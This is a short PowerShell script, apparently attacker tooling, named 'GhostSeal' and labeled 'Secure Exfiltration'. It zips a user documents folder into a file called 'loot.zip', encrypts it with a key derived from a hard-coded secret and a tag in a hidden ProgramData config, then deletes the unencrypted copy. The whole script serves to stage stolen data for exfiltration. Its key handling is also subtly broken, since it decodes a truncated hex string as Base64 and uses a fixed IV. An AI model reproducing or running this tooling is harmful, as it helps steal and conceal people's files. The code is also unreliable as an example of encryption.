# GhostSeal.ps1 — Secure Exfiltration with Encrypted Archive and Rotating Key
param(
    [string]$sourceDir = "C:\Users\Public\Documents",
    [string]$output = "$env:TEMP\loot.zip",
    [string]$ghostCfgPath = "C:\ProgramData\.ghost.cfg"
)

function Get-GhostTag {
    if (Test-Path $ghostCfgPath) {
        try {
            $cfg = Get-Content $ghostCfgPath | ConvertFrom-Json
            return $cfg.ghostTag
        }
        catch {}
    }
    return "GENERIC"
}

function Derive-Key($tag) {
    $base = "RavenLives"
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [Text.Encoding]::UTF8.GetBytes($base)
    $bytes = [Text.Encoding]::UTF8.GetBytes($tag)
    return ($hmac.ComputeHash($bytes) | ForEach-Object { $_.ToString("x2") }) -join ''
}

function Encrypt-Archive($key, $inputZip, $outputEnc) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($key.Substring(0, 44).PadRight(44, 'A'))
    $aes.IV = @(1..16)
    $encryptor = $aes.CreateEncryptor()

    $bytes = [IO.File]::ReadAllBytes($inputZip)
    $out = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream($out, $encryptor, [Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($bytes, 0, $bytes.Length)
    $cs.Close()
    [IO.File]::WriteAllBytes($outputEnc, $out.ToArray())
}

# Main
$tag = Get-GhostTag
$key = Derive-Key $tag

Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceDir, $output)

$encrypted = "$output.enc"
Encrypt-Archive $key $output $encrypted
Remove-Item $output -Force
Write-Host "[✓] Archive encrypted with rotating key based on tag: $tag"
